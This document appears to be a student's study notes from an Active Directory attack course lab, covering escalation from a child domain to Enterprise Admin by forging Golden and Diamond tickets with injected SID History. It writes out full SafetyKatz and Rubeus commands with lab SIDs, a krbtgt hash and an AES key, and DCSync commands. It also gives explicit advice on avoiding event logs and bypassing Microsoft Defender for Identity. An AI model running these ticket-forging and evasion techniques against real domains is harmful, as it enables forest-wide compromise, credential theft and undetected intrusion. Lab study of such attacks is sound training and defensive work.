- Is there a shorter (and better!) way than injecting SID History, Forging an inter-realm TGT and requesting a parent domain TGS, to escalate to Enterprise Admin?
	- Yes!
- ![[Pasted image 20250812214834.png]]
- In place of forging an inter-realm TGT, we acquire the AES key of the krbtgt account of current domain, and directly forge a Golden Ticket (for the regular TGT sent to our current domain, not for an inter-realm TGT) with a SID History.
- This is performed in step 3 of the authentication flow, which means that right before we present the TGT to our current domain, we inject the SID History in the ticket.
- Due to the trust, the parent domain will trust the TGT, if the current DC trusts the TGT and sends it to the forest root, the only validation that the forest root will do is to see if it can decrypt the inter-realm TGT!
- The only difference in using mimikatz to forge a Golden Ticket Attack and forging a TGT with a SID History of Enterprise Admins is that in this case, we mention the SID of the Enterprise Admin with the `/sids` flag.
	- `SafetyKatz.exe "keberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<Base SID of the current domain> /sids:<Enterprise Admin group SID of the parent domain> /krbtgt:<secret of the krbtgt account> /ptt" "exit"`
- We don't even need to use the `asktgs` module from Rubeus, since we do not forge the inter-realm TGT, which is generated by the current domain's KDC itself and will continue to facilitate the authentication flow as expected.

#### Note: The command to forge a Diamond Ticket w/ injected SID History, is provided at the end of the OPSEC-safe methods to perform this attack, and is the most OPSEC safe way to gain access by forging a ticket with an injected SID History.

#### Practical Demonstration - Forging a Golden Ticket w/ a SID History using Rubeus
- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:<base SID of the current domain> /sids:<Enterprise Admins group SID for the Forest Root> /aes256:<AES 256 key of the krbtgt account> /netbios:dcorp /ptt`
- `winrs -r:mcorp-dc cmd`
	- `set username`
- Now we can access any service on any machine in the Forest root, without the need for requesting a ST for each of the services.
- OPSEC concerns:
	- But we will observe here that we are accessing the Forest root DC, as the Administrator of the child domain (`Administrator.dcorp`).
	- We will leave the following logs: 4624, 4634, and a 4672 (Administrator log on on a Forest root DC!), 4672 from any machine on a child domain is a very big reason for concern.
	- No Domain Admin should be able to log on to the Forest root DC.
	- In some environments, this would lead to detection right away.
- OPSEC safe(-r) methods:
	- A DC of a child domain logging on to a Forest root DC is not as suspicious as a Child DC Administrator logging in:
		- We can completely avoid logs and bypass MDI for a DCSync on the Forest root's DC by doing the following:
			- Using SafetyKatz:
				- `SafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"`
					  - `S-1-5-21-2578538781-2508153159-3419410681-516` - Domain Controllers
					  - `S-1-5-9` - Enterprise Domain Controllers
				  - `SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"` 
			- Using Rubeus (even more OPSEC friendly):
				- `Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /dc:DCORP-DC.dollarcorp.moneycorp.local /ptt`
					  - `S-1-5-21-2578538781-2508153159-3419410681-516` - Domain Controllers
					  - `S-1-5-9` - Enterprise Domain Controllers
				- `SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"`
		- This is because a DC of a child domain should be able to synchronise with and run replication on the Forest root DC.
		- In place of injecting a SID History of an Enterprise Admins group, we inject two SID Histories, one of the DC group of the Forest root, along with the well known SID of the Enterprise Domain Controllers.
		- We cannot interactively log on to the forest root with the child domain DC SID, but we can now run DCSync on the parent domain's DC.
		- This is one of the few known bypasses of MDI for OPSEC friendly DCSync, otherwise MDI is very sensitive of DCSync attacks.
			- When MDI complains about DCSync attacks, it specifies that the foothold or other non-DC machines we may perform the attack from are not a recognised DC, but since dcorp-dc is a DC, it will not alert MDI.
			- If we perform a DCSync attack on our own domain from a domain DC, we won't trigger MDI either.
	- Performing a Diamond ticket attack instead of a golden ticket attack, with injected SID History is the most OPSEC safe way to perform this attack:
		- What has been the OSPEC problem with Golden tickets?
			- The Diamond ticket has a corresponding TGT request, in a Golden ticket attack, we are skipping steps 1 and 2 of the authentication flow, which may lead to detection. However in the case of a Diamond ticket attack, we are modifying a valid TGT requested directly from the DC.
			- The following command is the ultimate most OPSEC safe command for forging a ticket with injected SID History:
				- `Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
				- `SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"`
			- This command bypasses the following:
				- Suspicious logs in the current domain
				- Suspicious logs in the parent domain
				- MDI in the current domain
				- MDI in the parent domain

#### Learning Objective 19
- Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.
	- Already demonstrated earlier.